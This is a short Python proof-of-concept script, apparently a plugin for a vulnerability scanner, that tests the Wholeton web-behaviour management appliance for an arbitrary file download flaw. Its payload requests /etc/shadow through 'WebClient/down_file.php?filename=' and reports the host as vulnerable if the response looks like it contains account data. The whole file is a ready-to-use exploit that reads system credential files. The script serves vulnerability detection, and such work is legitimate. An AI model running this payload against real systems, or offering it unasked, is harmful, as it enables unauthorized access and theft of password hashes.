#!/usr/bin/env python
# -*- coding: utf-8 -*-
import re

'''
POC Name: 惠尔顿上网行为管理系统任意文件下载
Author  :  saobaxing
mail    :  1984729530
Referer :http://www.wooyun.org/bugs/wooyun-2015-0100472
'''
def assign(service, arg):
    if service == "wholeton":
        return True, arg


def audit(arg):
     
    payload1 = "WebClient/down_file.php?filename=/etc/shadow"

    url = arg + payload1
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and 'root' in res or 'admin' in res or  'mysql' in res:
        security_hole(url)


if __name__ == '__main__':
    from dummy import *
    audit(assign('wholeton','http://www.example.com/')[1])